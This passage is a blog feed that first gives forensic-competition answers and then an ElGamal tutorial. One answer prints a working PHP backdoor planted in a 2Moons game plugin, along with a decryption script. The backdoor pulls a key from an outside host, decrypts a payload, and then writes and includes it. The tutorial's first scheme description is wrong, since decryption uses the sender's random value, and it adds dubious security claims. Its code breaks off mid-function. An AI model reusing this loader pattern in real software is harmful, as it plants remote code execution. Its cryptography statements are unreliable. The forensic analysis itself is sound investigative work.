alt="FIC24"></p><p>8.请分析陈某宣传所用域名，该博客域名最终DNS解析指向的github仓库名为</p><p><strong>chewhaoN.github.io</strong></p><p><img src="/img/image-20250428222515332.png" alt="FIC25"></p><p>9.请分析陈某github账号，陈某对jkroepke&#x2F;2Moons项目增改了几个文件</p><p><strong>2</strong></p><p>把两个项目克隆到本地，删除两个文件夹内的 <code>.git</code> 目录, 使用 <code>git diff</code> 指令, 进行比对:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">git diff -- 2Moons 2Moons0 查看文件的差异<br>$ git diff chewhaoN_2Moons/ jkroepke_2Moons/<br>diff --git a/chewhaoN_2Moons/encrypted.bin b/chewhaoN_2Moons/encrypted.bin<br>deleted file mode 100644<br>index d6a0dce..0000000<br>--- a/chewhaoN_2Moons/encrypted.bin <span class="hljs-comment">#陈某增加了一个文件</span><br>+++ /dev/null<br>@@ -1 +0,0 @@<br>-9T8NBGdXI1Xe46fDOsPmrmuhAD9Rk/XQMRukLHJDXMm9wexBjKY/8QQv1OvxCiA87B0ZQ9kFgQiJ0fCquio0EcK5sWr1yUMYrapSWgUXMbD2/P4Qs9lO1cc53rRgZ8lg5r7d21YJkFFkyKJDMAmEjw==<br>\ No newline at end of file<br>diff --git a/chewhaoN_2Moons/includes/libs/Smarty/plugins/block.textformat.php b/jkroepke_2Moons/includes/libs/Smarty/plugins/block.textformat.php<br>index 359a53f..e9f5fe2 100644<br>--- a/chewhaoN_2Moons/includes/libs/Smarty/plugins/block.textformat.php<span class="hljs-comment">#陈某修改了内容</span><br>+++ b/jkroepke_2Moons/includes/libs/Smarty/plugins/block.textformat.php<br>@@ -33,9 +33,8 @@<br>  * @<span class="hljs-built_in">return</span> string content re-formatted<br>  * @author Monte Ohrt &lt;monte at ohrt dot com&gt;<br>  */<br>-<br>-   <span class="hljs-keyword">function</span> smarty_block_textformat(<span class="hljs-variable">$params</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$template</span>, &amp;<span class="hljs-variable">$repeat</span>)<br>-&#123;<br>+<span class="hljs-keyword">function</span> smarty_block_textformat(<span class="hljs-variable">$params</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$template</span>, &amp;<span class="hljs-variable">$repeat</span>)<br>+&#123;<br>     <span class="hljs-keyword">if</span> (is_null(<span class="hljs-variable">$content</span>)) &#123;<br>         <span class="hljs-built_in">return</span>;<br>     &#125;<br>@@ -110,6 +109,4 @@<br>     &#125; <span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-built_in">return</span> <span class="hljs-variable">$_output</span>;<br>     &#125;<br>-    <span class="hljs-variable">$a</span>=file_get_contents(<span class="hljs-string">&#x27;https://foren6.atwebpages.com/woyao/eat/%E7%81%AB%E9%94%85/%E8%9C%82%E8%9C%9C%E9%94%85%E5%BA%95.css&#x27;</span>);<span class="hljs-variable">$b</span>=md5(<span class="hljs-variable">$a</span>,<span class="hljs-literal">true</span>);<span class="hljs-variable">$c</span>=file_get_contents(<span class="hljs-string">&#x27;../../../../encrypted.bin&#x27;</span>);<span class="hljs-variable">$d</span>=base64_decode(<span class="hljs-variable">$c</span>);<span class="hljs-variable">$e</span>=<span class="hljs-string">&#x27;aes-256-cbc&#x27;</span>;<span class="hljs-variable">$f</span>=openssl_cipher_iv_length(<span class="hljs-variable">$e</span>);<span class="hljs-variable">$g</span>=substr(<span class="hljs-variable">$d</span>,0,<span class="hljs-variable">$f</span>);<span class="hljs-variable">$h</span>=substr(<span class="hljs-variable">$d</span>,<span class="hljs-variable">$f</span>);<span class="hljs-variable">$i</span>=openssl_decrypt(<span class="hljs-variable">$h</span>,<span class="hljs-variable">$e</span>,<span class="hljs-variable">$b</span>,OPENSSL_RAW_DATA,<span class="hljs-variable">$g</span>);<span class="hljs-variable">$j</span>=sys_get_temp_dir();<span class="hljs-variable">$k</span>=<span class="hljs-variable">$j</span>.<span class="hljs-string">&#x27;/func_&#x27;</span>.uniqid().<span class="hljs-string">&#x27;.php&#x27;</span>;file_put_contents(<span class="hljs-variable">$k</span>,<span class="hljs-string">&quot;&lt;?php\n&quot;</span>.<span class="hljs-variable">$i</span>);include <span class="hljs-variable">$k</span>;<span class="hljs-built_in">unlink</span>(<span class="hljs-variable">$k</span>);yijuhua();<br>-<br> &#125;<br></code></pre></td></tr></table></figure><p>10.请分析陈某 github 账号，陈某在修改 <code>2Moons</code> 过程中提到了什么锅底</p><p><strong>蜂蜜锅底</strong></p><p><code>https://foren6.atwebpages.com/woyao/eat/%E7%81%AB%E9%94%85/%E8%9C%82%E8%9C%9C%E9%94%85%E5%BA%95.css</code></p><p>url解码为：</p><p><img src="/img/image-20250429155203277.png" alt="FIC25"></p><p>11.请分析陈某 github 账号，陈某在游戏 <code>2Moons</code> 中放置的后门连接码的密码为</p><p><strong>ficnb</strong></p><p>可以分析php代码逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;https://foren6.atwebpages.com/woyao/eat/%E7%81%AB%E9%94%85/%E8%9C%82%E8%9C%9C%E9%94%85%E5%BA%95.css&#x27;</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>, <span class="hljs-literal">true</span>);  <span class="hljs-comment">// 生成 MD5 哈希（二进制形式）作为密钥</span><br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;../../../../encrypted.bin&#x27;</span>); <span class="hljs-comment">// 读取加密文件</span><br><span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$c</span>);  <span class="hljs-comment">// Base64 解码</span><br><span class="hljs-variable">$e</span> = <span class="hljs-string">&#x27;aes-256-cbc&#x27;</span>;     <span class="hljs-comment">// 使用 AES-256-CBC 算法</span><br><span class="hljs-variable">$f</span> = <span class="hljs-title function_ invoke__">openssl_cipher_iv_length</span>(<span class="hljs-variable">$e</span>); <span class="hljs-comment">// 获取 IV 长度（16字节）</span><br><span class="hljs-variable">$g</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$d</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$f</span>);  <span class="hljs-comment">// 提取 IV（初始向量）</span><br><span class="hljs-variable">$h</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$d</span>, <span class="hljs-variable">$f</span>);     <span class="hljs-comment">// 提取加密数据</span><br><span class="hljs-variable">$i</span> = <span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$h</span>, <span class="hljs-variable">$e</span>, <span class="hljs-variable">$b</span>, OPENSSL_RAW_DATA, <span class="hljs-variable">$g</span>); <span class="hljs-comment">// 解密数据</span><br><span class="hljs-variable">$j</span> = <span class="hljs-title function_ invoke__">sys_get_temp_dir</span>(); <span class="hljs-comment">// 获取系统临时目录</span><br><span class="hljs-variable">$k</span> = <span class="hljs-variable">$j</span> . <span class="hljs-string">&#x27;/func_&#x27;</span> . <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-string">&#x27;.php&#x27;</span>; <span class="hljs-comment">// 生成唯一文件名</span><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$k</span>, <span class="hljs-string">&quot;&lt;?php\n&quot;</span> . <span class="hljs-variable">$i</span>);  <span class="hljs-comment">// 写入解密后的代码</span><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$k</span>;  <span class="hljs-comment">// 包含并执行</span><br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$k</span>);  <span class="hljs-comment">// 删除临时文件</span><br><span class="hljs-title function_ invoke__">yijuhua</span>();   <span class="hljs-comment">// 调用恶意函数</span><br></code></pre></td></tr></table></figure><p>将远程css文件下载到本地，逆向输出yijuhua()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;蜂蜜锅底.css&#x27;</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>, <span class="hljs-literal">true</span>);<br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;./encrypted.bin&#x27;</span>);<br><span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-variable">$e</span> = <span class="hljs-string">&#x27;aes-256-cbc&#x27;</span>;<br><span class="hljs-variable">$f</span> = <span class="hljs-title function_ invoke__">openssl_cipher_iv_length</span>(<span class="hljs-variable">$e</span>);<br><span class="hljs-variable">$g</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$d</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$f</span>);<br><span class="hljs-variable">$h</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$d</span>, <span class="hljs-variable">$f</span>);<br><span class="hljs-variable">$i</span> = <span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$h</span>, <span class="hljs-variable">$e</span>, <span class="hljs-variable">$b</span>, OPENSSL_RAW_DATA, <span class="hljs-variable">$g</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$i</span>;<br></code></pre></td></tr></table></figure><p><img src="/img/image-20250429171151012.png" alt="FIC26"></p><p>12.请访问陈某当前博客，陈某课程的扫码报名地址的域名为</p><p><strong><code>https://fic.forensix.cn</code></strong></p><p>扫码就行</p><p><img src="/img/image-20250428224908728.png" alt="FIC27"></p><p>13.请分析陈某当前博客，通过互联网找到陈某的旧博客网站标题为</p><p><strong>柳如烟大战霸天虎</strong></p><p><img src="/img/image-20250428225022065.png" alt="FIC28"></p><p>访问forensix2025.work.gd，无法访问，查看Web Archives</p><p><strong>Web Archives（网络存档）</strong> 是互联网内容的“历史图书馆”，通过定期抓取和保存网页快照，确保即使原始网页被删除、修改或无法访问，其历史版本仍可被查看。</p><p>可以看到标题：柳如烟大战霸天虎</p><p><img src="/img/image-20250428230206601.png" alt="FIC29"></p><p>14.请分析陈某旧博客，陈某的姓名为</p><p><strong>陈浩北</strong></p><p>见题13</p><p>15.请分析陈某旧博客，陈某的邮箱地址为</p><p><strong><a href="mailto:&#109;&#x61;&#105;&#108;&#x6d;&#x65;&#64;&#99;&#x68;&#x65;&#x6e;&#x2e;&#x66;&#x6f;&#x72;&#x65;&#110;&#x36;">&#109;&#x61;&#105;&#108;&#x6d;&#x65;&#64;&#99;&#x68;&#x65;&#x6e;&#x2e;&#x66;&#x6f;&#x72;&#x65;&#110;&#x36;</a></strong></p><p>查看源代码搜索<code>mail</code>或<code>@</code></p><p><img src="/img/image-20250429135938274.png" alt="FIC30"></p><p>16.请分析陈某旧博客，陈某的11位手机号为</p><p><strong>13170010703</strong></p><p>见题15</p><p>17.请分析陈某旧博客，陈某最爱的dota英雄为</p><p><strong>邪影芳灵</strong></p><p><img src="/img/image-20250429140253595.png" alt="FIC21"></p>]]></content>
      
      
      <categories>
          
          <category> Forensic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Forensic </tag>
            
            <tag> FIC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EIGamal密码算法</title>
      <link href="/2024/05/25/EIGamal/"/>
      <url>/2024/05/25/EIGamal/</url>
      
        <content type="html"><![CDATA[<h1 id="EIGamal密码算法"><a href="#EIGamal密码算法" class="headerlink" title="EIGamal密码算法"></a>EIGamal密码算法</h1><p>EIGamal密码算法是一种基于离散对数问题的非对称加密算法，由Taher ElGamal在1985年提出。该算法的安全性依赖于有限域中离散对数问题的难解性，利用指数函数的单向性质实现加密和解密。</p><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><ol><li><strong>密钥生成</strong>：<ul><li>选择一个大素数 <em>p</em>，使得 <em>p</em>−1 有大素因子。</li><li>选择一个模 <em>p</em> 的本原根 <em>g</em>，并将 <em>p</em> 和 <em>g</em> 公开。</li><li>用户选择一个私钥 <em>x</em>，其中 x∈[0,<em>p</em>−1]，并计算公钥<em>y</em>&#x3D;<em>g</em>^x mod <em>p</em>。</li></ul></li><li><strong>加密过程</strong>：<ul><li>发送方选择一个随机数 <em>a</em>，满足 1&lt;<em>a</em>&lt;<em>p</em>−1。</li><li>计算 <em>c</em> 1&#x3D;<em>g</em>^<em>a</em> mod <em>p</em>。</li><li>选择一个随机数 <em>k</em>，满足 2≤<em>k</em>&lt;<em>p</em>。</li><li>计算 <em>c</em> 2&#x3D;<em>m</em> . (<em>c</em> 1^<em>k</em>) mod <em>p</em>，其中 <em>m</em> 是明文消息。</li><li>密文为 (<em>c</em> 1,<em>c</em> 2)。</li></ul></li><li><strong>解密过程</strong>：<ul><li>接收方计算 <em>s</em>&#x3D;(<em>c</em> 1^k) mod <em>p</em>。</li><li>计算 (<em>s</em>^−1)mod <em>p</em>。</li><li>计算 <em>m</em>&#x3D;<em>c</em> 2⋅(<em>s</em>^−1) mod <em>p</em>。</li></ul></li></ol><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ol><li><strong>随机性</strong>：在加密过程中引入了随机数 𝑘<em>k</em>，增加了密文的随机性和安全性。</li><li><strong>密文长度</strong>：密文是明文的两倍，这进一步增强了其安全性。</li><li><strong>乘法同态</strong>：EIGamal加密算法具有乘法同态的特性，即密文与一个因子的乘积等于原始明文与同一因子的乘积的加密结果。</li></ol><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>EIGamal算法广泛应用于数字证书、电子商务、数字签名等领域。例如，在数字证书中，EIGamal算法可以用于签名和验证，保证证书的真实性和完整性，从而保障信息的安全性。在电子商务中，它可以用于支付、订单等环节的加密，防止欺诈和篡改。</p><h3 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h3><p>EIGamal算法的安全性基于离散对数问题的难解性。</p><p>EIGamal密码算法通过引入随机数和增加密文长度来提高安全性，并且具有乘法同态的特性，使其在多个应用场景中都非常有用。</p><h4 id="具体实现细节"><a href="#具体实现细节" class="headerlink" title="具体实现细节"></a>具体实现细节</h4><p>ElGamal加密算法是一种基于离散对数问题的非对称加密算法，由塔希尔·盖莫尔在1985年提出。其实现细节可以分为以下几个步骤：</p><h4 id="1-密钥生成"><a href="#1-密钥生成" class="headerlink" title="1. 密钥生成"></a>1. 密钥生成</h4><ol><li><strong>选择大素数</strong>：首先，需要随机生成一个大素数<em>p</em>，并且确保<em>p</em>−1是可被某个小于它的正整数<em>g</em>整除，这个<em>g</em>称为原根。</li><li><strong>选择私钥</strong>：选择一个私钥<em>x</em>，其中0&lt;<em>x</em>&lt;<em>p</em>−1。私钥<em>x</em>将用于生成公钥。</li><li><strong>计算公钥</strong>：使用公式<em>y</em>&#x3D;(<em>g</em>^<em>x</em>) mod <em>p</em>来计算公钥<em>y</em>。公钥由<em>p</em>、<em>g</em>和<em>y</em>组成。</li></ol><h4 id="2-加密过程"><a href="#2-加密过程" class="headerlink" title="2. 加密过程"></a>2. 加密过程</h4><ol><li><strong>选择随机数</strong>：每次加密时，都需要选择一个随机数<em>k</em>，其中1&lt;<em>k</em>&lt;<em>p</em>−1。</li><li><strong>计算临时密钥</strong>：使用公式<em>c</em> 1&#x3D;(<em>g</em>^<em>k</em>) mod <em>p</em>来计算第一个临时密钥<em>c</em> 1。</li><li><strong>计算第二个临时密钥</strong>：使用公式<em>c</em> 2&#x3D;<em>m</em>⋅(<em>y</em>^<em>k</em>) mod <em>p</em>来计算第二个临时密钥<em>c</em> 2，其中<em>m</em>是明文消息。</li><li><strong>生成密文</strong>：将两个临时密钥<em>c</em> 1和<em>c</em> 2组合成一个密文，即密文为(𝑐1,𝑐2)</li></ol><h4 id="3-解密过程"><a href="#3-解密过程" class="headerlink" title="3. 解密过程"></a>3. 解密过程</h4><ol><li><strong>计算临时密钥</strong>：使用公式<em>s</em>&#x3D;(<em>c</em> 1^<em>x</em>) mod <em>p</em>来计算临时密钥<em>s</em>。</li><li><strong>恢复明文</strong>：使用公式<em>m</em>&#x3D;<em>c</em> 2⋅(<em>s</em>^−1) mod <em>p</em>来恢复明文。</li></ol><h4 id="4-安全性"><a href="#4-安全性" class="headerlink" title="4. 安全性"></a>4. 安全性</h4><p>ElGamal加密算法的安全性依赖于<em>离散对数问题的难解性。即在给定基数g</em>、模<em>p</em>和某个幂次<em>y</em>的情况下，找到满足(<em>g</em>^<em>x</em>) mod <em>p</em>&#x3D; <em>y</em>的整数<em>x</em>是困难的。</p><h4 id="5-实际应用"><a href="#5-实际应用" class="headerlink" title="5. 实际应用"></a>5. 实际应用</h4><p>ElGamal加密算法广泛应用于密码学系统中，如GnuPG和PGP等。它可以定义在任何循环群<em>G</em>上，其安全性取决于该群上的离散对数难题。</p><h3 id="优势和劣势"><a href="#优势和劣势" class="headerlink" title="优势和劣势"></a>优势和劣势</h3><p>EIGamal密码算法与其他公钥加密算法（如RSA）相比，具有以下优势和劣势：</p><h4 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h4><ol><li><strong>高安全性</strong>：<ul><li>EIGamal算法基于离散对数问题，这是一个数学难题，使得破解变得极其困难，从而为数据提供了强大的保护。</li><li>相比之下，RSA算法虽然也采用非对称加密方式，但其安全性主要依赖于大质数分解和离散对数问题。</li></ul></li><li><strong>灵活性高</strong>：<ul><li>EIGamal既可以用于数据加密，也可以用于数字签名。这使得它在多种应用场景中都非常有用。</li></ul></li><li><strong>密钥管理简便</strong>：<ul><li>EIGamal的密钥管理相对简单，公钥可以公开，而私钥由用户保管。这使得在实际应用中更容易进行密钥的分发和管理。</li></ul></li><li><strong>适用于大数据量</strong>：<ul><li>EIGamal算法适用于大数据量的加密，因为其加&#x2F;解密速度较快。</li></ul></li></ol><h4 id="劣势"><a href="#劣势" class="headerlink" title="劣势"></a>劣势</h4><ol><li><strong>加密长度较长</strong>：<ul><li>EIGamal算法的加密结果通常比RSA算法的加密结果要长。这可能会导致在某些应用场景中，EIGamal的效率不如RSA。</li></ul></li><li><strong>计算复杂度较高</strong>：<ul><li>尽管EIGamal算法的逆运算可以通过平方乘的方法有效计算出来，但其基本操作仍然比RSA算法复杂。</li></ul></li><li><strong>普及度较低</strong>：<ul><li>相比于RSA算法，EIGamal算法在实际应用中的普及度较低。这可能是由于其加密结果较长以及计算复杂度较高所致。</li></ul></li></ol><p>EIGamal密码算法在安全性、灵活性和密钥管理方面具有显著优势，但在加密长度和计算复杂度方面存在一定的劣势。</p><h3 id="大乘法同态问题"><a href="#大乘法同态问题" class="headerlink" title="大乘法同态问题"></a>大乘法同态问题</h3><ol><li><strong>改进ElGamal算法</strong>：原始的ElGamal算法仅具备乘法同态性，但可以通过对其进行改进，设计出既具有乘法同态性又具有加法同态性的变体加密方案。这种改进不仅增强了安全性，还能执行常数乘的同态运算。</li><li><strong>使用Schönhage-Strassen算法（SSA）</strong>：针对全同态加密（FHE）的应用需求，可以采用基于Schönhage-Strassen算法的硬件架构来实现快速的大数乘法。这种方法通过并行架构和有限域快速数论变换（NTT）来优化大整数乘法的计算效率。</li><li><strong>生成大素数和生成元</strong>：在ElGamal方案中，生成一个大素数和生成元是关键步骤。这些参数的选择直接影响到加密和解密过程的安全性和效率。通过优化这些参数的生成，可以提高整体系统的性能。</li><li><strong>利用离散对数难题</strong>：ElGamal算法是基于离散对数难题的公钥加密体系。通过进一步研究和优化离散对数问题的求解方法，可以提高加密和解密过程的安全性和效率。</li><li><strong>并行优化</strong>：对于大整数乘法，可以采用Pohlig-Hellman算法的分治策略，并行优化计算过程。这种方法可以显著提高大整数乘法的计算速度。</li></ol><p>解决EIGamal密码算法中的大乘法同态问题需要综合考虑算法改进、硬件架构优化、参数生成优化以及并行计算策略等多方面因素。</p><h3 id="安全漏洞"><a href="#安全漏洞" class="headerlink" title="安全漏洞"></a>安全漏洞</h3><ol><li><strong>离散对数问题</strong>：EIGamal算法的安全性依赖于计算有限域上离散对数这一难题。如果离散对数问题被解决，那么EIGamal算法将会变得不安全。</li><li><strong>侧信道攻击</strong>：在某些情况下，EIGamal加密可能会受到侧信道攻击的影响。例如，Libgcrypt在处理ElGamal加密时，由于缺乏指数模糊处理（exponent blinding），容易受到侧信道攻击。</li><li><strong>伪造签名</strong>：如果攻击者知道了某个人的公钥，他们可以伪造该人士的签名信息。这是因为攻击者可以通过选择合适的整数来计算出伪造的签名，从而绕过正常的验证过程。</li><li><strong>碰撞问题</strong>：虽然EIGamal算法本身没有直接的碰撞问题，但在实际应用中，其他相关算法如MD5和SHA可能存在碰撞问题，这也可能间接影响到EIGamal算法的安全性。</li><li><strong>密文长度问题</strong>：EIGamal加密过程中生成的密文长度是明文的两倍，这可能导致较大的数据传输量，从而增加了被攻击的风险。</li></ol><h3 id="改进方向"><a href="#改进方向" class="headerlink" title="改进方向"></a>改进方向</h3><p>EIGamal密码算法的最新研究进展和改进方向主要集中在以下几个方面：</p><ol><li><strong>逐比特加解密</strong>：一种改进的ElGamal算法可以实现逐比特地进行加解密，这种方法使得被加密消息可以任意比特长，提高了灵活性和应用范围。</li><li><strong>安全性和效率的提升</strong>：随着密码学和网络安全领域的不断发展，对ElGamal算法进行改进和优化，以及研究和发展更安全、更高效的加密和签名机制将是未来的重要方向。例如，通过建表以及对传统二进制算法进行改进，即将指数进行2k进制化，可以减少原BR算法迭代次数，从而提高加解密速度。</li><li><strong>信息隐藏和图像加密</strong>：基于ElGamal的改进最低有效位信息隐藏算法能够准确提取秘密信息，并且在提高数据嵌入量的同时，为数据提供了更高级别的安全性。</li><li><strong>数字签名方案的改进</strong>：对原始的ElGamal数字签名方案进行了改进，减少了模逆运算的次数，并增加了随机数，以增强安全性。此外，还有针对无Hash函数的ElGamal离散对数数字签名问题的改进方案，但这些方案可能存在伪造签名攻击的问题。</li><li><strong>算法的环签名改进</strong>：研究了ElGamal算法的环签名改进方案，这也是其发展的一个方向。</li></ol><p>EIGamal密码算法的最新研究进展和改进方向包括逐比特加解密、安全性和效率的提升、信息隐藏和图像加密、数字签名方案的改进以及算法的环签名改进等方面。</p><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><br><span class="hljs-comment"># 查找最大公约数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gcd</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">if</span> a &lt; b:<br>        <span class="hljs-keyword">return</span> gcd(b, a)<br>    <span class="hljs-keyword">elif</span> a % b == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> b<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> gcd(b, a % b)<br><br><span class="hljs-comment"># 快速幂和模运算</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">power</span>(<span class="hljs-params">a, b, c</span>):<br>    ans = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> b != <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">if</span> b &amp; <span class="hljs-number">1</span>:<br>            ans = (ans * a) % c<br>        b &gt;&gt;= <span class="hljs-number">1</span><br>        a = (a * a) % c<br>    <span class="hljs-keyword">return</span> ans<br><br><span class="hljs-comment"># 检测大质数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Miller_Rabin</span>(<span class="hljs-params">n</span>):<br>    a = random.randint(<span class="hljs-number">2</span>,n-<span class="hljs-number">2</span>) <span class="hljs-comment"># 随机找到 &#x27;a&#x27; 属于 [2,n-2]</span><br>    s = <span class="hljs-number">0</span>                     <span class="hljs-comment"># s 是 d 中因子 2 的幂</span><br>    d = n - <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (d &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>:       <span class="hljs-comment"># 让我们分解出 d 中所有的 2。</span><br>        s += <span class="hljs-number">1</span><br>        d &gt;&gt;= <span class="hljs-number">1</span><br><br>    x = power(a, d, n)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(s):        <span class="hljs-comment"># 执行 s 次二次探测</span><br>        newX = power(x, <span class="hljs-number">2</span>, n)<br>        <span class="hljs-keyword">if</span> newX == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> x != <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> x != n - <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> 